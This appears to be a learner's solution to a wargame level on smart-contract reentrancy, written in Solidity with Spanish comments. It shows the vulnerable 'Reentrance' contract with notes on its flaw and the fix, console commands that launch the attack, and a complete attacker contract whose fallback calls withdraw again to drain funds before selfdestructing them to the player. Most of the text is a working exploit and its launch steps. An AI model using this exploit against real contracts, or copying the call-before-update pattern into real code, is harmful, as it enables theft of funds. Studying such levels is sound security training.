pragma solidity ^0.4.18;

contract Reentrance {
  
// me mapeo las direcciones hacia los balances de cada cuenta
  mapping(address => uint) public balances;

// funcion pagable y publica que me permite donar hacia una direccion, dando como input el valor de ether que mando en la transaccion
  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }


// me devuelve el balance de una direccion que le paso. Es publica la funcion y parece estar ok
  function balanceOf(address _who) public constant returns (uint balance) {
    return balances[_who];
  }


// funcion publica que retira efectivo dado en wei. 
  function withdraw(uint _amount) public {
// si el balance del que la llama tiene mas o mismos fondos que desea retirar, entonces continua
    if(balances[msg.sender] >= _amount) {
//aca hace algo raro. La funcion call devuelve un bool que dice si la transaccion pudo hacerse o si fallo. La cosa es que cuando la llamo en el if, estimo que se ejecuta y puede hacerme fallar el resto de la funcion ya que me quedo sin fondos (no?). Lo que haces es que a la direccion mia, llama un call para enviarme el valor que le ingrese.
      if(msg.sender.call.value(_amount)()) {
      
      // que mierda hace escribir la variable pelada en una linea? La devuelve segun una pagina (?)
        _amount;
      }
      // luego si se confirmo todo, disminuye el valor en los balances del mapeo
      balances[msg.sender] -= _amount;
    }
  }

  // tiene una funcion fallback pagable para ingresar plata
  function() payable {}
}



// creo que hay un error en el IF mas interno, ya que en caso de que salga error, igual se ejecuta la linea balances[msg.sender] -= _amount;

// cuando me manda el call hacia el sender, al transferirle plata va a tener que parar a una funcion fallback que sea payable. Luego en esa funcion, si yo llamo nuevamente a withdraw ANTES de que ejecute la resta en mi balance (linea mas abajo), entonces podria seguir sacando fondos del aire. Utilizo el codigo del killdaking porque es parecido

// para proteger este error, lo que debo hacer es primero restarle el valor al balance antes de llamar a otro contrato. De esa forma no salta el error

contract.address = 0xe4490aeaa687a07dd0f82877c4321fc1f52be34b
contratointermedio = 0x0a58f1e46f15d4f5b8cb431af10da5b3e0654169
await contract.balanceOf("0x0a58f1e46f15d4f5b8cb431af10da5b3e0654169")
await contract.donate("0x0a58f1e46f15d4f5b8cb431af10da5b3e0654169", {value: 1})
await contract.balanceOf("0x0a58f1e46f15d4f5b8cb431af10da5b3e0654169")
web3.sha3("pagointermedio()") = 0x9c9269d2
sendTransaction({from: player, to: "0x0a58f1e46f15d4f5b8cb431af10da5b3e0654169", value: toWei(1), data: "0x9c9269d2"})




pragma solidity ^0.4.18;

contract entrada {
    
    address public dir_yo = msg.sender;
    address public target = 0xe4490aeaa687a07dd0f82877c4321fc1f52be34b;
    address public esteContrato = this;
    uint8 public cont;
    bool public activ = true;

    // guardo la direccion del target desde un input
    function direccion(address _target) public {
        target = _target;
    }
    
    function pagointermedio() public payable {
    //    esteContrato.transfer(_amount);
    }
    
    
    // mato el mensajero
    function destroy() public { 
        selfdestruct(dir_yo);
    }
    
    function check_balance() public view returns (uint) {
      return esteContrato.balance;
    }
    
    function reset() public {
        cont = 0;
    }
    
    function act_switch() public {
        activ = !activ;
    }
    
    function retira(uint _amount) public {
        if(target.call(bytes4(keccak256("withdraw(uint256)")), _amount)){}
    }
    
    function () public payable {
        if(activ && cont == 2) {
            return;
        }
        
        cont++;
        if(target.call(bytes4(keccak256("withdraw(uint256)")), 1)){}
        //if(target.call(bytes4(keccak256("withdraw(uint)")), 1)){}
    }
}
